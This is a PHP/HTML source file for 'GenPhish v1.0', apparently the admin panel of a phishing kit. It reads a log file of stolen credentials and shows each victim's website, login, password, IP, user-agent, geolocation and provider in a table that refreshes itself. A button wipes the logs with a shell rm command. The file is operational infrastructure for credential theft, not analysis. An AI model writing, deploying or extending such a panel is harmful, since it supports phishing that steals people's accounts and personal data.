<?php header("Refresh: 5;"); ?> <!-- Refresh 5s -->

<html lang="fr" xml:lang="fr">
	<head>
		<title>GenPhish</title>
		<link rel="stylesheet" type="text/css" href="style.css">
		<link rel="shortcut icon" type="image/x-icon" href="icons/GenPhish.ico">
		<meta charset="utf-8">
	</head>
	<body>
		<p><img src="icons/GenPhish.ico" alt="Logo"></p>
		<h1>GenPhish<span>v1.0</span></h1>

<?php
	$file="ident.txt";
	$length=shell_exec("wc -l $file | cut -d ' ' -f 1");
	$i=1;
?>
		<!-- Form for delete -->
		<form id="form" method="POST" action="#" name="formDelete">
			<input type="submit" name="delete" value="Delete all logs">
		</form>

<?php if(isset($_POST['delete'])){ shell_exec("rm $file && touch $file"); } ?>

		<p>Total : <?php echo "<b>".$length."</b>"; ?></p>
		<table>
			<thead>
				<tr>
					<th>N°</th>
					<th>Date</th>
					<th>Website</th>
					<th>Login</th>
					<th>Password</th>
					<th>IP</th>
					<th>User-Agent</th>
					<th>Geolocation</th>
					<th>Timezone</th>
					<th>Provider</th>
				</tr>
			</thead>
			<tbody>
<?php
while($i <= $length){
	$date=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 1");
	$website=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 2");
	$username=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 3");
	$password=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 4");
	$ip=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 6");
	$useragent=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 5");
	$geolocation=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 7-9 | tr '|' ' '");
	$timezone=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 10");
	$org=shell_exec("cat $file | sed -n \"$i p\" | cut -d '|' -f 11");
?>
				<tr>
					<th><center><?php echo $i; ?></center></th>
					<td><?php echo $date; ?></td>
					<td><?php echo $website; ?></td>
					<td abbr="color"><?php echo $username; ?></td>
					<td abbr="color"><?php echo $password; ?></td>
					<td><?php echo $ip; ?></td>
					<td><?php echo $useragent; ?></td>
					<td><?php echo $geolocation; ?></td>
					<td><?php echo $timezone; ?></td>
					<td><?php echo $org; ?></td>
				</tr>
<?php $i=$i+1; } ?>
			</tbody>
		</table> 
   	</body>
   	<footer>@hacknonym</footer>
</html>
